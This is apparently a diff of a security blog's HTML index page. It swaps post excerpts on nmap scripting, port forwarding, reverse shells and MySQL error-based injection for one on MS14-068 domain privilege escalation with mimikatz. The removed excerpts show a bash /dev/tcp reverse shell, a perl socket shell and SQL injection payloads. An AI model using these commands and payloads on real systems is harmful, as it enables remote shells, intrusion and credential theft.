@@ -339,124 +339,22 @@
     
     
     <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/17/nmap高级用法/" >
+        <a class="abstract-title" href = "/2019/06/30/域权限提升14-068/" >
             
-                <span>nmap高级用法</span>
+                <span>域权限提升14-068</span>
         </a>
         <div class="abstract-content">
-            nmap进阶
-1. Nmap 脚本引擎12345678910111213• auth：负责处理鉴权证书（绕开鉴权）的脚本• broadcast：在局域网内探查更多服务开启状况，如 dhcp/dns/sqlserver 等服务。• brute：提供暴力破解方式，针对常见的应用如 http/snmp 等• default：这是使用-sC 或 A 选项扫描时默认的脚本，提供基本扫描能力• discovery：对网络进行更多的信息，如 SMB 枚举、SNMP 查询等• dos：用于进行拒绝服务攻击• exploit：利用已知的漏洞入侵系统• external：利用第三方的数据库或资源，例如 wh...
+            ^.^不忘初心，方得始终。
+域权限提升14-068MS14-068编号CVE-2014-6324，补丁为3011780，如果自检可在域控制器上使用命令检测 
+1systeminfo |find "3011780"
+1.当获取到一个权限之后，利用溢出或者其他办法尽量把权限提到最高
+2.利用溢出加载mimikataz获取当前系统内的账号密码域信息
+3.通过mimikatz抓取：123456789101112131415域提权的基本要求如下： 账号:zhangsan 密码:2wsx3edc@WSX#EDC 域:ADMINCC（net view /domain） 域管名字:（dsquery se...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
             <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/17</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/13/端口转发集合/" >
-            
-                <span>端口转发集合</span>
-        </a>
-        <div class="abstract-content">
-            一些常用的端口转发集合
-1. Linux  portmap转发ssh到外网 不太常用
-123./portmap -m 2 -p1 6666 -h2 8.8.8.8 -p2 7777    #先在外网执行./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 8.8.8.8 -p2 6666  #在内网shell下执行ssh 127.0.0.1 -p 7777   #在外网机器上执行
-2. Windows lcx转发3389到外网
-123lcx.exe -listen 1234 2333   #本地 监听1234端口,转发数据到2333端口lcx.exe -slav...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/13</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/13/渗透测试中常见的端口/" >
-            
-                <span>渗透测试中常见的端口</span>
-        </a>
-        <div class="abstract-content">
-            在渗透中一些常见的的服务端口.
-1、web类(web漏洞/敏感目录)1234第三方通用组件漏洞struts thinkphp jboss ganglia zabbix 80 web 80-89 web 8000-9090 web
-2、数据库类(扫描弱口令)123451433 MSSQL 1521 Oracle 3306 MySQL 5432 PostgreSQL 6379 Redis
-3、特殊服务类(未授权/命令执行类/漏洞)12345678910443 SSL心脏滴血 873 Rsync未授权 5984 CouchDB http://xxx:5984/_utils/ 6379 redi...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/13</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/12/linux反弹shell的方式收集/" >
-            
-                <span>linux反弹shell的方式收集</span>
-        </a>
-        <div class="abstract-content">
-            以下命令均来自互联网.
-1.bash版本：1bash -i &gt;&amp; /dev/tcp/1.1.1.1/8080 0&gt;&amp;1
-2.perl版本:1perl -e 'use Socket;$i="1.1.1.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&a...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/12</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/07/12/十种MySQL报错注入/" >
-            
-                <span>十种MySQL报错注入</span>
-        </a>
-        <div class="abstract-content">
-            摘自《代码审计：企业级Web代码安全架构》
-十种MySQL报错注入1.floor()1select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
-
-2.extractvalue()1select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
-
-3.u...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/07/12</span>
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/06/30</span>
             </div>
             <!-- tags  -->
             
@@ -554,47 +452,9 @@
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 5
+        Total : 1
         </div>
         <!-- search  -->
         
@@ -605,32 +465,12 @@
     
     
     
-    <div class="archive-year"> 2018 </div>
+    <div class="archive-year"> 2019 </div>
     <ul class="year-list">
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2018/07/17/nmap高级用法/" >nmap高级用法</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/端口转发集合/" >端口转发集合</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2018/07/13/渗透测试中常见的端口/" >渗透测试中常见的端口</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2018/07/12/linux反弹shell的方式收集/" >linux反弹shell的方式收集</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2018/07/12/十种MySQL报错注入/" >十种MySQL报错注入</a>
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href= "/2019/06/30/域权限提升14-068/" >域权限提升14-068</a>
         </li>
     
     </div>
